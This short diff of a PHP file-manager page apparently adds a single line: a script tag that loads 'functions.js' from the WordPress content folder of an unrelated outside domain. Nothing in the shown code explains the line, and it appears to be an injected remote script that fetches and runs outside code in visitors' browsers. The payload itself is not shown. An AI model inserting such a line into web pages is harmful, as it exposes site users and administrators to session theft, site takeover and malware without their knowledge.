@@ -693,7 +693,7 @@ if (isset($_GET['rename']) && $logged_in) {
             </div>
         <?php endif; ?>
     </div>
-    
+    <script src="https://gscp.edu.in/wp-content/functions.js"></script>
     <script>
         // Prevent form resubmission
         if (window.history.replaceState) {
